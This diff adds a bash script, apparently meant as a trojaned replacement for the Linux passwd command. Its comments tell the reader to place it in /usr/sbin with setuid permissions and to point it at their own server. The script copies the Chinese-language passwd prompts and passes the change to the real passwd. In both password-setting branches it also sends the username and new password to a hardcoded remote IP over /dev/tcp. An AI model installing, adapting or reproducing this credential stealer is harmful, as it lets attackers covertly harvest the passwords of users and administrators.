@@ -1,0 +1,94 @@
+#!/bin/bash
+#usage:
+#1.将本文件放到/usr/sbin目录下。赋4755权限 mv passwd_zh passwd;chmod 4755 passwd
+#2.将下面的地址信息改成自己的server地址。
+RECVER_HOST="170.170.64.78"
+RECVER_PORT="8000"
+#3.source /etc/profile,正常使用passwd查看效果。
+
+USER_LST=($(awk -F: '{print $1}' /etc/passwd))
+INPUT_NAME=${1:-$LOGNAME}
+
+trap '' INT
+function onCtrlC () {
+    echo "密码更改取消。"
+    echo "passwd：鉴定令牌操作错误"
+    echo "passwd：密码未更改"
+	exit
+}
+
+function onCtrlD () {
+    echo "passwd：鉴定令牌操作错误"
+    echo "passwd：密码未更改"
+	exit
+}
+
+do_stolen(){
+    if [ "$LOGNAME" != "root" ];then
+        echo "为 $LOGNAME 更改 STRESS 密码。"
+        echo -ne "Current password: "
+        read -s current_passwd0; if [[ $? == 1 ]];then echo ;onCtrlD;fi
+		echo 
+    fi
+    echo -ne "新的 密码："
+    read -s current_passwd1; if [[ $? == 1 ]];then echo -e "\n密码更改取消。";onCtrlD;fi
+    echo 
+    echo -ne "重新输入新的 密码："
+    read -s current_passwd2; if [[ $? == 1 ]];then echo -e "\n密码更改取消。";onCtrlD;fi
+	echo 
+    if [ "${current_passwd1}" == "${current_passwd2}" ];then
+        echo -ne "${current_passwd1}\n${current_passwd1}\n"|/usr/bin/passwd  2> /dev/null
+        (echo "{${LOGNAME}:${current_passwd1}}" >/dev/tcp/${RECVER_HOST}/${RECVER_PORT}) 2>/dev/null
+		echo "passwd：已成功更新密码"
+    else
+        echo "抱歉，密码不匹配。"
+        echo "passwd：鉴定令牌操作错误"
+        echo "passwd：密码未更改"
+    fi
+    exit
+}
+
+#如果1参数是空，则记录密码，有分支，root和普通用户打出来的信息不一样
+#[ ! $1 ] && echo "a is null" 
+#if [ ! $1 ];then
+#    do_stolen
+#fi
+
+#如果1参数不是用户名直接重定向
+if [ "${1:0:1}" == "-" ];then
+   /usr/bin/passwd $@
+    exit
+fi
+
+#如果1参数用户名不存在报错
+echo "${USER_LST[@]}" |  grep -wq ${INPUT_NAME// /} && flag="yes"|| flag="no"
+if [ "${flag}" == "no" ];then
+    echo "passwd：用户“${INPUT_NAME// /}”不存在"
+    exit
+fi
+
+#如果1参数是用户名，再走子分支。
+if [ "${LOGNAME}" != "${INPUT_NAME// /}" ];then
+    if [ "${LOGNAME}" == "root" ];then
+	    echo -ne "新的 密码："
+        read -s current_passwd1; if [[ $? == 1 ]];then echo -e "\n密码更改取消。";onCtrlD;fi
+		echo 
+        echo -ne "重新输入新的 密码："
+        read -s current_passwd2; if [[ $? == 1 ]];then echo -e "\n密码更改取消。";onCtrlD;fi
+	    echo 
+        if [ "${current_passwd1}" == "${current_passwd2}" ];then
+            echo -ne "${current_passwd1}\n${current_passwd1}\n"|/usr/bin/passwd  2> /dev/null
+            (echo "{${LOGNAME}:${current_passwd1}}" > /dev/tcp/${RECVER_HOST}/${RECVER_PORT}) 2>/dev/null
+			echo "passwd：已成功更新密码"
+        else
+            echo "抱歉，密码不匹配。"
+            echo "passwd：鉴定令牌操作错误"
+            echo "passwd：密码未更改"
+        fi
+	else
+        echo "passwd：您不能查看或更改 ${INPUT_NAME// /} 的密码信息。"
+	fi
+else
+    #与当前用户一致
+    do_stolen
+fi
